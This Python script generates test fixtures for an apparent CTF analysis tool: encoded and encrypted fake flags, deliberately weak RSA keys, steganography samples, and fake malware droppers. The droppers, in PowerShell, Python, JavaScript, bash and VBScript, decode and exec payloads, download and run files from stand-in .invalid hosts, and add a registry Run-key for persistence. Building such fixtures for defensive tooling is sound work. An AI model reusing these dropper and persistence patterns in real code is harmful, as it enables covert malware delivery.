"""Generate the test fixtures in tests/fixtures/ (run: make fixtures).

Every fixture mirrors a real challenge shape, built with known keys and fake flags.
The output is deterministic (fixed seed), so re-running it changes nothing.
Never put real challenge flags here.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import io
import math
import random
import struct
import zipfile
import zlib
from pathlib import Path

from Crypto.Cipher import AES, PKCS1_OAEP, ChaCha20, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, getPrime, inverse, isPrime, long_to_bytes
from Crypto.Util.Padding import pad

FIXTURES = Path(__file__).parent / "fixtures"
RNG = random.Random(1337)  # fixed seed: same bytes every time


def write(name: str, data: bytes | str) -> None:
    path = FIXTURES / name
    path.write_bytes(data.encode("utf-8") if isinstance(data, str) else data)
    print(f"  {name:32} {path.stat().st_size} bytes")


def evp_bytes_to_key(
    password: bytes, salt: bytes, key_len: int, iv_len: int
) -> tuple[bytes, bytes]:
    """openssl's legacy KDF (MD5, 1 iteration): D_i = MD5(D_{i-1} || password || salt)."""
    derived = b""
    block = b""
    while len(derived) < key_len + iv_len:
        block = hashlib.md5(block + password + salt).digest()
        derived += block
    return derived[:key_len], derived[key_len : key_len + iv_len]


def tiny_png() -> bytes:
    """A valid 1x1 black PNG, built by hand (signature + IHDR + IDAT + IEND)."""

    def chunk(kind: bytes, body: bytes) -> bytes:
        crc = zlib.crc32(kind + body)
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", crc)

    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
    idat = zlib.compress(b"\x00\x00")
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def small_zip(name: str, content: bytes) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        info = zipfile.ZipInfo(name, date_time=(2024, 1, 1, 0, 0, 0))
        info.compress_type = zipfile.ZIP_DEFLATED  # ZipInfo defaults to "stored"
        archive.writestr(info, content)
    return buffer.getvalue()


def hide_zero_width(cover: str, secret: bytes) -> str:
    """Hide `secret` as bits: U+200B = 0, U+200C = 1, inserted after the first word."""
    bits = "".join(f"{byte:08b}" for byte in secret)
    hidden = "".join("​" if bit == "0" else "‌" for bit in bits)
    first, rest = cover.split(" ", 1)
    return first + hidden + " " + rest


ENGLISH = (
    "This is a secret message for the team. The meeting is moved to Friday night, "
    "bring the usual equipment and do not talk about it on the phone. "
    "Remember that the password for the server is written on the back of the old "
    "notebook. When you read this, the flag is CYBN{fixture_xor_repeating}. "
)


def xor(data: bytes, key: bytes) -> bytes:
    """Repeating-key XOR (written here independently of ctfc, to test it)."""
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))


def cbc_cts_encrypt(plain: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-CBC with ciphertext stealing, CS1 layout (what `openssl -cts` produces).

    Written independently of ctfc on purpose: the test must not check the code
    against itself. Verified against `openssl enc -aes-128-cbc-cts`.
    """
    tail = len(plain) % 16
    if tail == 0:
        return AES.new(key, AES.MODE_CBC, iv).encrypt(plain)
    full = AES.new(key, AES.MODE_CBC, iv).encrypt(plain[: len(plain) - tail])
    last_full = full[-16:]
    stolen = plain[len(plain) - tail :] + bytes(16 - tail)
    stolen_xor = bytes(a ^ b for a, b in zip(last_full, stolen, strict=True))
    final = AES.new(key, AES.MODE_ECB).encrypt(stolen_xor)
    # CS1: the truncated block comes first, the full one last.
    return full[:-16] + last_full[:tail] + final


def fernet_token(key: bytes, message: bytes, timestamp: int) -> bytes:
    """Build a Fernet token by hand: version | timestamp | iv | AES-128-CBC | HMAC."""
    iv = hashlib.sha256(message).digest()[:16]  # deterministic, any IV works
    body = AES.new(key[16:], AES.MODE_CBC, iv).encrypt(pad(message, 16))
    parts = b"\x80" + timestamp.to_bytes(8, "big") + iv + body
    return base64.urlsafe_b64encode(parts + hmac.new(key[:16], parts, hashlib.sha256).digest())


def xtea_encrypt_block(block: bytes, key: bytes, endian: str = "big") -> bytes:
    """One XTEA block, written here from the published algorithm (32 rounds)."""
    fmt = ">" if endian == "big" else "<"
    mask, delta = 0xFFFFFFFF, 0x9E3779B9
    v0, v1 = struct.unpack(fmt + "II", block)
    words = struct.unpack(fmt + "4I", key)
    total = 0
    for _ in range(32):
        v0 = (v0 + (((((v1 << 4) ^ (v1 >> 5)) & mask) + v1) ^ (total + words[total & 3]))) & mask
        total = (total + delta) & mask
        v1 = (
            v1 + (((((v0 << 4) ^ (v0 >> 5)) & mask) + v0) ^ (total + words[(total >> 11) & 3]))
        ) & mask
    return struct.pack(fmt + "II", v0, v1)


def powershell_dropper() -> str:
    """A fake PowerShell dropper whose strings are hidden with a single-byte XOR (0x5A)."""

    def hidden(text: str) -> str:
        return ",".join(f"0x{ord(char) ^ 0x5A:02x}" for char in text)

    url = "http://update.example.invalid/payload.exe"
    flag = "CYBN{fixture_powershell_layers}"
    return (
        "# Windows update helper - do not remove\n"
        "$k = 0x5A\n"
        "function Decode-String($bytes) {\n"
        "    return -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
        "}\n"
        f"$url = Decode-String @({hidden(url)})\n"
        f"$tag = Decode-String @({hidden(flag)})\n"
        "$client = New-Object System.Net.WebClient\n"
        '$path = Join-Path $env:TEMP "update.exe"\n'
        "$client.DownloadFile($url, $path)\n"
        "Start-Process -FilePath $path -WindowStyle Hidden\n"
        'Write-Output "Update finished, please restart the computer when you can."\n'
    )


def lens_python_dropper() -> str:
    """A Python dropper: base64 -> AES-256-CBC -> exec. Never executed by the tests."""
    key = hashlib.sha256(b"correct horse battery staple").digest()
    iv = bytes.fromhex("0f1e2d3c4b5a69788796a5b4c3d2e1f0")
    payload = b'print("CYBN{fixture_lens_python_aes}")\n'
    blob = base64.b64encode(AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))).decode()
    return (
        "#!/usr/bin/env python3\n"
        '"""Invoice helper - do not edit."""\n'
        "import base64\n"
        "from Crypto.Cipher import AES\n"
        "from Crypto.Util.Padding import unpad\n"
        "\n"
        f'KEY = bytes.fromhex("{key.hex()}")\n'
        f'IV = bytes.fromhex("{iv.hex()}")\n'
        f'BLOB = "{blob}"\n'
        'CALLBACK = "http://invoice.example.invalid/report.php"\n'
        "\n"
        "def main():\n"
        "    stage = unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(BLOB)), 16)\n"
        "    exec(stage)\n"
        "\n"
        'if __name__ == "__main__":\n'
        "    main()\n"
    )


def lens_python_layers() -> str:
    """Python, three layers: base64 -> zlib -> repeating-key XOR -> exec."""
    payload = b'print("CYBN{fixture_lens_python_layers}")\n'
    key = b"L4y3rs!"
    blob = base64.b64encode(zlib.compress(xor(payload, key))).decode()
    return (
        "import base64, zlib\n"
        "\n"
        f"K = {key!r}\n"
        f'D = "{blob}"\n'
        "\n"
        "raw = zlib.decompress(base64.b64decode(D))\n"
        "out = bytes(b ^ K[i % len(K)] for i, b in enumerate(raw))\n"
        "exec(out)\n"
    )


def lens_python_fernet() -> str:
    """Python using Fernet with a hardcoded key."""
    key = base64.urlsafe_b64encode(hashlib.sha256(b"fernet-fixture").digest()).decode()
    return (
        "from cryptography.fernet import Fernet\n"
        "\n"
        f'FERNET_KEY = "{key}"\n'
        'TOKEN = "gAAAAABlTmFrZXRoaXNpc25vdGFyZWFsdG9rZW5idXRpdGxvb2tzbGlrZW9uZQ=="\n'
        "\n"
        "print(Fernet(FERNET_KEY).decrypt(TOKEN))\n"
    )


def lens_powershell_dropper() -> str:
    """PowerShell: base64 + single-byte XOR + AES through .NET + a download."""
    payload = 'Write-Host "CYBN{fixture_lens_powershell}"'
    blob = base64.b64encode(xor(payload.encode(), b"\x3b")).decode()
    key_bytes = ", ".join(f"0x{byte:02x}" for byte in hashlib.md5(b"ps-key").digest())
    iv_bytes = ", ".join(f"0x{byte:02x}" for byte in bytes(range(16)))
    return (
        "# Windows maintenance task\n"
        "$k = 0x3b\n"
        f'$enc = "{blob}"\n'
        "$bytes = [System.Convert]::FromBase64String($enc)\n"
        "$clear = -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
        "Invoke-Expression $clear\n"
        "\n"
        "$aes = New-Object System.Security.Cryptography.AesManaged\n"
        f"$aes.Key = [byte[]] @({key_bytes})\n"
        f"$aes.IV = [byte[]] @({iv_bytes})\n"
        "$client = New-Object System.Net.WebClient\n"
        '$client.DownloadFile("http://update.example.invalid/stage2.bin",'
        ' "C:\\Windows\\Temp\\s2.bin")\n'
        'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
        " -Name Updater -Value $PSCommandPath\n"
    )


def lens_javascript_cryptojs() -> str:
    """JavaScript: atob + charCodeAt XOR + CryptoJS.AES with a passphrase."""
    payload = 'console.log("CYBN{fixture_lens_javascript}")'
    blob = base64.b64encode(xor(payload.encode(), b"\x17")).decode()
    return (
        "// analytics helper\n"
        f'var enc = "{blob}";\n'
        "var raw = atob(enc);\n"
        'var out = "";\n'
        "for (var i = 0; i < raw.length; i++) {\n"
        "  out += String.fromCharCode(raw.charCodeAt(i) ^ 0x17);\n"
        "}\n"
        "eval(out);\n"
        "\n"
        'var secret = CryptoJS.AES.decrypt("U2FsdGVkX1+abcdefghijklmnopqrstuvwx==",'
        ' "s3cr3tpassphrase");\n'
        'fetch("http://analytics.example.invalid/beacon");\n'
    )


def lens_bash_openssl() -> str:
    """bash: base64 -d piped into openssl enc -d, with the password on the line."""
    payload = b'echo "CYBN{fixture_lens_bash}"\n'
    salt = bytes.fromhex("a1b2c3d4e5f60718")
    key, iv = evp_bytes_to_key(b"bashpass", salt, 32, 16)
    body = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))
    blob = base64.b64encode(body).decode()
    return (
        "#!/bin/bash\n"
        "# system health check\n"
        f'BLOB="{blob}"\n'
        'echo "$BLOB" | base64 -d'
        " | openssl enc -d -aes-256-cbc -md md5 -pass pass:bashpass | bash\n"
        "curl -s http://health.example.invalid/ping > /dev/null\n"
    )


def lens_vbs_dropper() -> str:
    """VBScript: Chr(Asc(c) Xor n) loop, a download and a Run."""
    payload = 'WScript.Echo "CYBN{fixture_lens_vbs}"'
    blob = "".join(f"{byte ^ 0x2A:02x}" for byte in payload.encode())
    return (
        "' Office update helper\n"
        f'Dim data : data = "{blob}"\n'
        "Dim out, i\n"
        "For i = 1 To Len(data) Step 2\n"
        '    out = out & Chr(Asc(Chr(CLng("&H" & Mid(data, i, 2)))) Xor 42)\n'
        "Next\n"
        "ExecuteGlobal out\n"
        "\n"
        'Set http = CreateObject("MSXML2.XMLHTTP")\n'
        'http.Open "GET", "http://office.example.invalid/update.dat", False\n'
        'Set shell = CreateObject("WScript.Shell")\n'
        'shell.Run "cmd /c echo done"\n'
    )


def next_prime(start: int) -> int:
    """The first prime >= start (used to build two primes that are too close)."""
    candidate = start | 1
    while not isPrime(candidate):
        candidate += 2
    return candidate


def write_rsa_fixtures() -> None:
    """One RSA fixture per classic mistake, plus a correct keypair.

    `getPrime(..., randfunc=RNG.randbytes)` keeps everything deterministic.
    """
    # 1. A correct 1024-bit keypair, with the flag under OAEP and under PKCS#1 v1.5.
    p = getPrime(512, randfunc=RNG.randbytes)
    q = getPrime(512, randfunc=RNG.randbytes)
    key = RSA.construct((p * q, 65537, inverse(65537, (p - 1) * (q - 1)), p, q))
    write("rsa_private.pem", key.export_key())
    write("rsa_public.pem", key.publickey().export_key())
    secret = b"CYBN{fixture_rsa_oaep}"
    write("rsa_oaep.bin", PKCS1_OAEP.new(key.publickey()).encrypt(secret))
    write(
        "rsa_pkcs1v15.bin",
        PKCS1_v1_5.new(key.publickey()).encrypt(b"CYBN{fixture_rsa_pkcs1v15}"),
    )
    # The textbook case: no padding at all, which plenty of challenges use.
    textbook = bytes_to_long(b"CYBN{fixture_rsa_textbook}")
    write("rsa_textbook.bin", long_to_bytes(pow(textbook, 65537, p * q)))

    # 2. e = 3 on a short message: no key needed, the cube root is the message.
    p3 = getPrime(512, randfunc=RNG.randbytes)
    q3 = getPrime(512, randfunc=RNG.randbytes)
    while (p3 - 1) % 3 == 0:
        p3 = getPrime(512, randfunc=RNG.randbytes)
    while (q3 - 1) % 3 == 0:
        q3 = getPrime(512, randfunc=RNG.randbytes)
    n3 = p3 * q3
    message = bytes_to_long(b"CYBN{fixture_rsa_small_e}")
    assert message**3 < n3, "the message must be short enough not to wrap"
    write("rsa_small_e.pub.pem", RSA.construct((n3, 3)).export_key())
    write("rsa_small_e.bin", long_to_bytes(pow(message, 3, n3)))

    # 3. Two keys sharing a prime: gcd of the moduli breaks both.
    shared = getPrime(512, randfunc=RNG.randbytes)
    other_a = getPrime(512, randfunc=RNG.randbytes)
    other_b = getPrime(512, randfunc=RNG.randbytes)
    n_a, n_b = shared * other_a, shared * other_b
    write("rsa_shared_a.pub.pem", RSA.construct((n_a, 65537)).export_key())
    write("rsa_shared_b.pub.pem", RSA.construct((n_b, 65537)).export_key())
    key_a = RSA.construct((n_a, 65537, inverse(65537, (shared - 1) * (other_a - 1))))
    write(
        "rsa_shared_a.bin", PKCS1_OAEP.new(key_a.publickey()).encrypt(b"CYBN{fixture_rsa_shared}")
    )

    # 4. p and q next to each other: Fermat finds them in a few steps.
    base = getPrime(512, randfunc=RNG.randbytes)
    p_close = next_prime(base)
    q_close = next_prime(p_close + 2)
    n_close = p_close * q_close
    key_close = RSA.construct((n_close, 65537, inverse(65537, (p_close - 1) * (q_close - 1))))
    write("rsa_fermat.pub.pem", RSA.construct((n_close, 65537)).export_key())
    write(
        "rsa_fermat.bin", PKCS1_OAEP.new(key_close.publickey()).encrypt(b"CYBN{fixture_rsa_fermat}")
    )

    # 5. A private exponent far too small: Wiener's attack.
    while True:
        pw = getPrime(512, randfunc=RNG.randbytes)
        qw = getPrime(512, randfunc=RNG.randbytes)
        phi = (pw - 1) * (qw - 1)
        d_small = getPrime(120, randfunc=RNG.randbytes)
        if math.gcd(d_small, phi) != 1:
            continue
        e_big = inverse(d_small, phi)
        if e_big.bit_length() > 1000:  # e must really be the big one
            break
    n_w = pw * qw
    write("rsa_wiener.pub.pem", RSA.construct((n_w, e_big)).export_key())
    key_w = RSA.construct((n_w, e_big, d_small, pw, qw))
    write("rsa_wiener.bin", PKCS1_OAEP.new(key_w.publickey()).encrypt(b"CYBN{fixture_rsa_wiener}"))

    # 6. The layered case CLAUDE.md asks for: an AES key||iv blob wrapped with
    #    RSA-OAEP, and the payload encrypted with that AES key.
    blob = RNG.randbytes(48)
    write("rsa_wrapped_key.bin", PKCS1_OAEP.new(key.publickey()).encrypt(blob))
    payload = b"CYBN{fixture_rsa_wrapped_aes} the key travelled inside the RSA blob."
    write(
        "rsa_wrapped_payload.bin",
        AES.new(blob[:32], AES.MODE_CBC, blob[32:]).encrypt(pad(payload, 16)),
    )


def main() -> None:
    FIXTURES.mkdir(exist_ok=True)
    print(f"writing fixtures to {FIXTURES}")

    # Multi-layer encoding: text -> hex -> zlib -> base64
    text = b"Good job, the flag is CYBN{fixture_layers_b64_zlib_hex}"
    write("layers_b64_zlib_hex.txt", base64.b64encode(zlib.compress(text.hex().encode())))

    # Reversed base64 (PowerShell droppers love this)
    write("reversed_b64.txt", base64.b64encode(b"CYBN{fixture_reversed}")[::-1])

    # PowerShell -EncodedCommand: base64 of UTF-16LE
    command = "Write-Host 'CYBN{fixture_encodedcommand}'"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
    write("powershell_encoded.txt", f"powershell.exe -NoP -W Hidden -enc {encoded}\n")

    # AES-ECB with repeated plaintext blocks
    key = RNG.randbytes(16)
    plaintext = b"YELLOW SUBMARINE" * 4 + b"CYBN{fixture_ecb_mode_leaks}"
    write("aes_ecb_repeated.bin", AES.new(key, AES.MODE_ECB).encrypt(pad(plaintext, 16)))

    # openssl enc -aes-256-cbc -md md5 (legacy KDF), raw and base64 versions
    salt = RNG.randbytes(8)
    key, iv = evp_bytes_to_key(b"password123", salt, 32, 16)
    secret = b"CYBN{fixture_openssl_md5}\n"
    blob = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16))
    write("openssl_salted_md5.bin", blob)
    write("openssl_salted_md5.b64", base64.b64encode(blob) + b"\n")

    # PNG with a ZIP appended after IEND (polyglot)
    archive = small_zip("flag.txt", b"CYBN{fixture_polyglot_zip}")
    write("png_with_zip.png", tiny_png() + archive)

    # Zero-width steganography in normal text
    cover = "Nothing to see here, just a normal sentence about the weather."
    write("zero_width.txt", hide_zero_width(cover, b"CYBN{zero_width}"))

    # Binary with crypto constants: TEA delta (LE) and the AES S-box
    sbox_start = bytes.fromhex("637c777bf26b6fc53001672bfed7ab76")
    binary = RNG.randbytes(300) + struct.pack("<I", 0x9E3779B9) + RNG.randbytes(200)
    write("crypto_constants.bin", binary + sbox_start + RNG.randbytes(100))

    # Repeating-key XOR of English text (key length 6)
    xor_key = b"x0rK3y"
    xored = bytes(byte ^ xor_key[i % len(xor_key)] for i, byte in enumerate(ENGLISH.encode()))
    write("xor_repeating.bin", xored)

    # --- XOR (M2) ---
    write("xor_single_byte.bin", xor(ENGLISH.encode(), b"\x5a"))
    # Two layers: repeating key "secret", then the single byte 0x42
    write("xor_two_layers.bin", xor(xor(ENGLISH.encode(), b"secret"), b"\x42"))
    # A PNG file XORed with a 4-byte key: the PNG header is the known plaintext
    write("xor_png.bin", xor(tiny_png() + RNG.randbytes(64), b"k3y!"))
    # Multi-layer: text -> XOR -> zlib -> base64 (decode: base64, zlib, XOR)
    layered = xor(ENGLISH.replace("xor_repeating", "multi_layer").encode(), b"K3y!")
    write("layers_b64_zlib_xor.txt", base64.b64encode(zlib.compress(layered)) + b"\n")
    # PowerShell dropper: strings XORed with 0x5A inside, whole script XORed
    # with a repeating key, then base64
    script = powershell_dropper().encode()
    write("powershell_xor.b64", base64.b64encode(xor(script, b"Upd4t3r!")) + b"\n")
    # Two messages encrypted with the same key stream (two-time pad)
    stream = RNG.randbytes(80)
    write(
        "two_time_pad_1.bin", xor(b"Meet the courier at the train station tonight at nine.", stream)
    )
    write("two_time_pad_2.bin", xor(b"The password for the archive is written on the map.", stream))
    # Too short for statistics: only the crib "CYBN{" can break it (key length 5)
    short = b"Here is what you wanted: CYBN{crib_dragging_works} bye"
    write("xor_short_crib.bin", xor(short, b"Qx7#9"))

    # --- symmetric ciphers (M3) ---
    # 48-byte key||iv blob (AES-256-CBC): the blob, and a ciphertext made with it
    blob = RNG.randbytes(48)
    write("key_iv_blob.b64", base64.b64encode(blob) + b"\n")
    message = (
        b"The archive password is hunter2 and the flag is CYBN{fixture_key_iv_blob}. "
        b"Do not write it down anywhere else, please."
    )
    write(
        "aes_cbc_keyiv_blob.bin",
        AES.new(blob[:32], AES.MODE_CBC, blob[32:]).encrypt(pad(message, 16)),
    )

    # AES-256-CBC with the IV prepended to the ciphertext (the most common layout)
    key = RNG.randbytes(32)
    iv = RNG.randbytes(16)
    secret = b"CYBN{fixture_iv_prefixed} the rest of this sentence is only here as filler."
    write("aes_cbc_iv_prefix.bin", iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16)))
    write("aes_cbc_iv_prefix.key", key.hex() + "\n")

    # AES-256-GCM as nonce || ciphertext || tag (what most Python snippets write out)
    nonce = RNG.randbytes(12)
    gcm = AES.new(key, AES.MODE_GCM, nonce=nonce)
    body, tag = gcm.encrypt_and_digest(b"CYBN{fixture_gcm_nonce_ct_tag}")
    write("aes_gcm_nonce_ct_tag.bin", nonce + body + tag)

    # AES-128-CBC with ciphertext stealing (CS1, what openssl's -cts does): the
    # plaintext length is not a multiple of 16 and no padding was added
    cts_key = RNG.randbytes(16)
    cts_iv = RNG.randbytes(16)
    cts_plain = b"CYBN{fixture_cts_mode} short tail here"  # 38 bytes = 2 blocks + 6
    write("aes_cbc_cts.bin", cts_iv + cbc_cts_encrypt(cts_plain, cts_key, cts_iv))
    write("aes_cbc_cts.key", cts_key.hex() + "\n")

    # openssl enc with the modern KDF: -aes-256-cbc -pbkdf2 -iter 10000 -md sha256
    salt = RNG.randbytes(8)
    raw = hashlib.pbkdf2_hmac("sha256", b"infected", salt, 10000, 48)
    padded = pad(b"CYBN{fixture_openssl_pbkdf2}\n", 16)
    body = AES.new(raw[:32], AES.MODE_CBC, raw[32:]).encrypt(padded)
    write("openssl_salted_pbkdf2.bin", b"Salted__" + salt + body)

    # A Fernet token (built by hand, so the `cryptography` package is not needed)
    fernet_key = RNG.randbytes(32)
    write("fernet_key.b64", base64.urlsafe_b64encode(fernet_key) + b"\n")
    write("fernet_token.txt", fernet_token(fernet_key, b"CYBN{fixture_fernet}", 1700000000) + b"\n")

    # ChaCha20 with a 12-byte nonce prepended to the ciphertext
    chacha_key = RNG.randbytes(32)
    chacha_nonce = RNG.randbytes(12)
    stream_cipher = ChaCha20.new(key=chacha_key, nonce=chacha_nonce)
    write(
        "chacha20_nonce_prefix.bin",
        chacha_nonce + stream_cipher.encrypt(b"CYBN{fixture_chacha20} and some filler text here."),
    )
    write("chacha20_nonce_prefix.key", chacha_key.hex() + "\n")

    # XTEA-CBC, big-endian words, PKCS7 padding, 16-byte key from a passphrase
    xtea_key = hashlib.md5(b"tiny").digest()
    xtea_iv = RNG.randbytes(8)
    xtea_plain = pad(b"CYBN{fixture_xtea_cbc} delta is 0x9e3779b9", 8)
    blocks = b""
    previous = xtea_iv
    for offset in range(0, len(xtea_plain), 8):
        chunk = xtea_plain[offset : offset + 8]
        block = bytes(a ^ b for a, b in zip(chunk, previous, strict=True))
        previous = xtea_encrypt_block(block, xtea_key, "big")
        blocks += previous
    write("xtea_cbc.bin", xtea_iv + blocks)

    # --- Code Lens (M4): one script per language, each with a different API ---
    # These files are DATA. Nothing in ctfc or in the tests ever executes them.
    write("lens_dropper.py", lens_python_dropper())
    write("lens_layers.py", lens_python_layers())
    write("lens_fernet.py", lens_python_fernet())
    write("lens_dropper.ps1", lens_powershell_dropper())
    write("lens_cryptojs.js", lens_javascript_cryptojs())
    write("lens_openssl.sh", lens_bash_openssl())
    write("lens_dropper.vbs", lens_vbs_dropper())

    # Text formats recognised by prefix
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=")
    payload = base64.urlsafe_b64encode(b'{"user":"admin"}').rstrip(b"=")
    write("jwt.txt", header + b"." + payload + b".c2lnbmF0dXJl\n")
    salt_hex = RNG.randbytes(20).hex()
    response_hex = RNG.randbytes(20).hex()
    write("mysqlna_hash.txt", f"$mysqlna${salt_hex}*{response_hex}\n")

    # --- RSA (M5) ---
    # Every key below is generated from the fixed seed, so the files never change.
    # They are all deliberately weak, one mistake each.
    write_rsa_fixtures()


if __name__ == "__main__":
    main()
